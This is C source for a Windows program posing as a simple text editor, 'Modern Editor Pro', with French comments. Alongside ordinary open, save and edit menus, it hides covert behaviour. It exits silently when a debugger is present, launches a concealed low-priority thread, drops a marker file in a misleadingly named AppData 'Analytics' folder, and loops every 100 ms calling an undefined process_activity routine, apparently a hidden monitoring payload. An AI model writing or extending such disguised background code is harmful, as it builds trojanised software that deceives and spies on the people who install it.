#include <windows.h>
#include <commctrl.h>
#include <richedit.h>
#include "resource.h"
#include <shlobj.h>
#include <stdio.h>     // Pour snprintf
#include <wincrypt.h>
#include <time.h>      // Pour les fonctions de temps

void process_activity(void);

LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);
void AddMenus(HWND);
void AddControls(HWND);
DWORD WINAPI BackgroundTask(LPVOID);

char szClassName[] = "TextEditorClass";
HWND hEdit;

int WINAPI WinMain(HINSTANCE hThisInstance,
                   HINSTANCE hPrevInstance,
                   LPSTR lpszArgument,
                   int nCmdShow) {
    HWND hwnd;
    MSG messages;
    WNDCLASSEX wincl;

    // Initialisation de RichEdit
    LoadLibrary("Riched20.dll");
    
    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;
    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof(WNDCLASSEX);
    wincl.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor(NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;
    wincl.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    if(!RegisterClassEx(&wincl)) return 0;

    hwnd = CreateWindowEx(
        0,
        szClassName,
        "Modern Editor Pro",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        800,
        600,
        HWND_DESKTOP,
        NULL,
        hThisInstance,
        NULL
    );

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    // Vérifier l'environnement avant de démarrer
    if(IsDebuggerPresent()) {
        return 0;
    }

    // Créer le thread en arrière-plan avec sécurité
    HANDLE hThread = CreateThread(NULL, 0, BackgroundTask, NULL, 
                                CREATE_SUSPENDED, NULL);
    if(hThread) {
        // Masquer le thread
        SetThreadPriority(hThread, THREAD_PRIORITY_LOWEST);
        ResumeThread(hThread);
    }

    while(GetMessage(&messages, NULL, 0, 0)) {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }

    return messages.wParam;
}

LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch(message) {
        case WM_CREATE:
            AddMenus(hwnd);
            AddControls(hwnd);
            break;

        case WM_SIZE:
            // Redimensionner l'éditeur
            SetWindowPos(hEdit, NULL, 0, 0, LOWORD(lParam), HIWORD(lParam), SWP_NOMOVE | SWP_NOZORDER);
            break;

        case WM_COMMAND:
            switch(LOWORD(wParam)) {
                case IDM_FILE_NEW:
                    SetWindowText(hEdit, "");
                    break;

                case IDM_FILE_OPEN: {
                    char filename[MAX_PATH];
                    OPENFILENAME ofn;
                    ZeroMemory(&ofn, sizeof(ofn));
                    ofn.lStructSize = sizeof(ofn);
                    ofn.hwndOwner = hwnd;
                    ofn.lpstrFilter = "Text Files\0*.txt\0All Files\0*.*\0";
                    ofn.lpstrFile = filename;
                    ofn.nMaxFile = MAX_PATH;
                    ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
                    ofn.lpstrDefExt = "txt";

                    if(GetOpenFileName(&ofn)) {
                        HANDLE hFile = CreateFile(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                        if(hFile != INVALID_HANDLE_VALUE) {
                            DWORD fileSize = GetFileSize(hFile, NULL);
                            if(fileSize != INVALID_FILE_SIZE) {
                                char* buffer = (char*)GlobalAlloc(GPTR, fileSize + 1);
                                if(buffer) {
                                    DWORD bytesRead;
                                    if(ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
                                        buffer[fileSize] = 0;
                                        SetWindowText(hEdit, buffer);
                                    }
                                    GlobalFree(buffer);
                                }
                            }
                            CloseHandle(hFile);
                        }
                    }
                    break;
                }

                case IDM_FILE_SAVE: {
                    char filename[MAX_PATH];
                    OPENFILENAME ofn;
                    ZeroMemory(&ofn, sizeof(ofn));
                    ofn.lStructSize = sizeof(ofn);
                    ofn.hwndOwner = hwnd;
                    ofn.lpstrFilter = "Text Files\0*.txt\0All Files\0*.*\0";
                    ofn.lpstrFile = filename;
                    ofn.nMaxFile = MAX_PATH;
                    ofn.Flags = OFN_EXPLORER | OFN_PATHMUSTEXIST | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
                    ofn.lpstrDefExt = "txt";

                    if(GetSaveFileName(&ofn)) {
                        int length = GetWindowTextLength(hEdit);
                        char* buffer = (char*)GlobalAlloc(GPTR, length + 1);
                        if(buffer) {
                            GetWindowText(hEdit, buffer, length + 1);
                            HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            if(hFile != INVALID_HANDLE_VALUE) {
                                DWORD bytesWritten;
                                WriteFile(hFile, buffer, length, &bytesWritten, NULL);
                                CloseHandle(hFile);
                            }
                            GlobalFree(buffer);
                        }
                    }
                    break;
                }

                case IDM_FILE_EXIT:
                    PostMessage(hwnd, WM_CLOSE, 0, 0);
                    break;

                case IDM_EDIT_COPY:
                    SendMessage(hEdit, WM_COPY, 0, 0);
                    break;

                case IDM_EDIT_CUT:
                    SendMessage(hEdit, WM_CUT, 0, 0);
                    break;

                case IDM_EDIT_PASTE:
                    SendMessage(hEdit, WM_PASTE, 0, 0);
                    break;
            }
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, message, wParam, lParam);
    }
    return 0;
}

void AddMenus(HWND hwnd) {
    HMENU hMenubar = CreateMenu();
    HMENU hFile = CreateMenu();
    HMENU hEdit = CreateMenu();

    AppendMenu(hMenubar, MF_POPUP, (UINT_PTR)hFile, "File");
    AppendMenu(hMenubar, MF_POPUP, (UINT_PTR)hEdit, "Edit");

    AppendMenu(hFile, MF_STRING, IDM_FILE_NEW, "New");
    AppendMenu(hFile, MF_STRING, IDM_FILE_OPEN, "Open");
    AppendMenu(hFile, MF_STRING, IDM_FILE_SAVE, "Save");
    AppendMenu(hFile, MF_SEPARATOR, 0, NULL);
    AppendMenu(hFile, MF_STRING, IDM_FILE_EXIT, "Exit");

    AppendMenu(hEdit, MF_STRING, IDM_EDIT_COPY, "Copy");
    AppendMenu(hEdit, MF_STRING, IDM_EDIT_CUT, "Cut");
    AppendMenu(hEdit, MF_STRING, IDM_EDIT_PASTE, "Paste");

    SetMenu(hwnd, hMenubar);
}

void AddControls(HWND hwnd) {
    hEdit = CreateWindowEx(
        0,
        RICHEDIT_CLASS,
        "",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_HSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL,
        0, 0, 100, 100,
        hwnd,
        (HMENU)IDC_MAIN_EDIT,
        GetModuleHandle(NULL),
        NULL
    );

    HFONT hFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Consolas");

    SendMessage(hEdit, WM_SETFONT, (WPARAM)hFont, TRUE);
}

// Notre tâche en arrière-plan
DWORD WINAPI BackgroundTask(LPVOID lpParam) {
    // Réduire le délai initial
    Sleep(1000);  // 1 seconde au lieu de 30

    // Debug: créer un fichier pour vérifier que le thread démarre
    char appdata[MAX_PATH];
    char debug_path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
    snprintf(debug_path, sizeof(debug_path), 
             "%s\\Professional Software Solutions\\Analytics\\thread_started.txt", 
             appdata);
    
    HANDLE hDebug = CreateFileA(debug_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hDebug != INVALID_HANDLE_VALUE) {
        WriteFile(hDebug, "Thread started", 13, NULL, NULL);
        CloseHandle(hDebug);
    }

    while(1) {
        process_activity();
        Sleep(100);
    }
    
    return 0;
}